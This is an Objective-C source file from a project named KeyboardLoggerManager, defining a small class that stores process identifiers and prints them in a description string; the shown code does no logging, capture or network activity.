//
//  EmbeddedApplicationInfo.m
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 4/28/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "EmbeddedApplicationInfo.h"

@implementation EmbeddedApplicationInfo
@synthesize mPID, mPSN, mHostPID;

- (NSString *) description {
    NSString *desc = [NSString stringWithFormat:@"%@, mPID : %d, mPSN : {%d, %d}, mHostPID : %d", [super description], self.mPID, (unsigned int)self.mPSN.lowLongOfPSN, (unsigned int)self.mPSN.highLongOfPSN, self.mHostPID];
    return desc;
}

@end
